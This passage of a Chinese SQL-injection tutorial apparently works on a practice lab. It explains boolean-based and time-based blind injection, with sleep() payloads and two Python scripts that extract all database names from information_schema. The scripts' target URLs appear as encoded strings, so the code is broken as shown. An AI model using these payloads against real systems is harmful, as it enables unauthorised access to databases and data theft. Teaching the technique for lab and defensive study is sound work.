
但是我们仍然想知道所有数据库的名称怎么办呢？那就改一下，继续跑，就是会慢一点，这里我们用一个变量统计一下看看它一共请求了多少次。

```
from requests import *
length=100
minlength=1
cnt=0
while minlength<length:
    mid=(length+minlength+1)//2
    sql='and (select length(group_concat(schema_name))<' + str(mid) + ' from information_schema.schemata)--+'
    url=` "408K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5J5y4#2)9J5k6e0m8Q4x3X3f1H3i4K6u0W2x3g2)9J5c8Y4y4I4L8r3W2Q4x3X3c8D9j5h3u0K6i4K6u0r3e0r3g2K6M7#2)9J5k6o6g2Q4x3V1k6Q4x3@1k6A6k6q4)9K6c8o6q4Q4x3U0M7`. " `+sql
    print(url)
    p=get(url)
    cnt+=1
    if 'You are in........... ' in p.text:
        length=mid-1
    else:
        minlength=mid
    print(length)
now_str=''
for i in range(length):
    l=0
    r=255
    while l<r:
        mid=(l+r+1)//2
        guess_str=now_str+chr(mid)
        #print(mid,l,r)
        sql="and (select ord(mid(group_concat(schema_name),{0},1))<{1} from information_schema.schemata);--+".format(i+1,mid)
        url=` "c5bK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5J5y4#2)9J5k6e0m8Q4x3X3f1H3i4K6u0W2x3g2)9J5c8Y4y4I4L8r3W2Q4x3X3c8D9j5h3u0K6i4K6u0r3e0r3g2K6M7#2)9J5k6o6g2Q4x3V1k6Q4x3@1k6A6k6q4)9K6c8o6q4Q4x3U0M7`. " `+sql
        print(url)
        p=get(url)
        cnt+=1
        if 'You are in........... ' in p.text:
            r=mid-1
        else:
            l=mid
        now_str+=chr(l)
    print(now_str)
print(cnt)
```

![30](https://bbs.kanxue.com/upload/attach/202205/919002_CN6T8D5JTMPH357.jpg)

可以看到注出这些数据库一共请求了 `758` 次，而且二分算是效率比较高的了，也许你会说我写的也有问题，范围应该限定在 `33-127`，但是对于二分来说，范围缩小一半也只是少请求一次而已，整个信息长度 `94`，我们理论上也就会少请求了 `94` 次。在经过实际测量之后，发现也是要请求 `632` 次的，所以盲注是不可能去手打的，一定要学会自己写脚本跑，自己会写能应对任何情况，而你如果一味的依靠 `sqlmap` 最终会发现吃亏的还是自己。

布尔盲注一般应用在页面无有关数据库内容的回显，报错也无提示，并且只有两种回显的结果的时候用的。比较万金油，但是会导致请求量很大，实际应用的时候如果限制请求次数那么会很难。

#### 基于时间的盲注

这个可以说是最后的法宝了，因为它使用所有的带有注入的页面。如果你的查询请求甚至不会有一点点的回显，比如说登录的时候都不告诉你登录成功或者账号密码失败，这个时候我们就只能使用基于时间的盲注了。

烫芝士：所有语言的特性—逻辑运算与和或都有这么个特性，两个表达式 `and`，如果第一个表达式为 `0` 那么不会运算第二个表达式，两个表达式 `or`，如果第一个表达式为 `1` 那么不会计算第二个表达式，两个表达式可以扩展到 `n` 个表达式。

基于此，我们给出第一个 `payload`

```
1' and 表达式 and sleep(5)--+
```

这里可以看到表达式为 `1` 那么会执行 `sleep`，如果为 `0`，那么不会执行。

我这里写了两个 `payload`，一个是 `1' and length(database())<5 and sleep(5)--+` 一个是 `1' and length(database())<9 and sleep(5)--+`，打开控制台的网络选项，我们可以看到

![31](https://bbs.kanxue.com/upload/attach/202205/919002_QNC5UQH79YE2DY5.jpg)

前者在 `10ms` 的时间内就返回了，而后者在 `5.02S` 才返回。可以看到后面的表达式为真就会休眠 `5S`，根据返回的时间差来判断表达式是否正确。

那么我们也来自己写一个脚本来跑跑时间盲注。

```
from requests import *
import time
length=100
minlength=1
ss=time.time()
cnt=0
while minlength<length:
    mid=(length+minlength+1)//2
    sql='and (select length(group_concat(schema_name))<' + str(mid) + ' from information_schema.schemata) and sleep(1)--+'
    url=` "b3bK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5J5y4#2)9J5k6e0m8Q4x3X3f1H3i4K6u0W2x3g2)9J5c8Y4y4I4L8r3W2Q4x3X3c8D9j5h3u0K6i4K6u0r3e0r3g2K6M7#2)9J5k6o6g2Q4x3V1k6Q4x3@1k6A6k6q4)9K6c8o6q4Q4x3U0M7`. " `+sql
    print(url)
    start=time.time()
    p=get(url)
    #print(time.time()-start)
    #quit()
    cnt+=1
    if time.time()-start>1:
        length=mid-1
    else:
        minlength=mid
    print(length)
now_str=''
for i in range(length):
    l=32
    r=127
    while l<r:
        mid=(l+r+1)//2
        guess_str=now_str+chr(mid)
        #print(mid,l,r)
        sql="and (select ord(mid(group_concat(schema_name),{0},1))<{1} from information_schema.schemata) and sleep(1);--+".format(i+1,mid)
        url=` "750K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5J5y4#2)9J5k6e0m8Q4x3X3f1H3i4K6u0W2x3g2)9J5c8Y4y4I4L8r3W2Q4x3X3c8D9j5h3u0K6i4K6u0r3e0r3g2K6M7#2)9J5k6o6g2Q4x3V1k6Q4x3@1k6A6k6q4)9K6c8o6q4Q4x3U0M7`. " `+sql
        print(url)
        start=time.time()
        p=get(url)
        cnt+=1
        if time.time()-start>1:
            r=mid-1
        else:
            l=mid
        now_str+=chr(l)
    print(now_str)
print(cnt)
print('cost:'+str(time.time()-ss))
```

跟布尔盲注差不多，就是在后面加上个 `sleep(1)` 就行了，我们也不用回显的结果去判断了，直接用经过的时间是否超过 `1S` 就好了。这里我们不仅统计了请求次数，我们还统计了花费时间。

![31](https://bbs.kanxue.com/upload/attach/202205/919002_GDUHQQPW5DK3A42.jpg)

可以看到请求次数跟上面是一样的(小声：我偷偷改了ASCII的范围)。并且注出这94个字符我们花费了将近 `4min`，可以看到这个时间成本也是非常高的。

##### 总结

基于时间的盲注基本适用于所有含有注入漏洞的页面，但是时间成本是最高的。

## 小结

`sql` 注入也就学了这么多，暂时先写到这里吧，后续学了新的芝士再来补充。

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2022-5-6 16:54

被kanxue编辑，原因：
